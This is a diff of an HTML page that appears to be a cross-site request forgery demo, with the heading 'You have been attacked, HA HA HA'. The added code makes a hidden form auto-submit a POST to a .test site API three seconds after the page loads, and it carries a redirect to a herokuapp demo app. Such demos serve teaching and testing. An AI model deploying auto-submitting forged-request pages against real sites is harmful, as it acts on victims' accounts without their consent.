@@ -8,29 +8,16 @@
     <h1>You have been attacked, HA HA HA</h1>
 
 
-    <form id="csrf-form" method='POST' action="https://tommy-design.test/api/weba/v3/site" onsubmit="return false;">
-      <input type="submit">
+    <form id="csrf-form" method='POST' action="https://tommy-design.test/api/weba/v3/site">
+      <INPUT TYPE="hidden" NAME="redirect" VALUE="https://csrf-demo-app.herokuapp.com/index.html">
     </form>
  
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
     <script type='text/javascript'>
-      // setTimeout(function(){
-      //   document.getElementById('csrf-form').submit();
-      //   sleep(2000);
-      // }, 3000)
-
-
-      $('#csrf-form').submit(function(){
-    $.ajax({
-      url: $('#csrf-form').attr('action'),
-      type: 'POST',
-      data : $('#csrf-form').serialize(),
-      success: function(){
-        alert('form submitted.');
-      }
-    });
-    return false;
-});
+      setTimeout(function(){
+        document.getElementById('csrf-form').submit();
+        sleep(2000);
+      }, 3000)
     </script>
   </body>
 
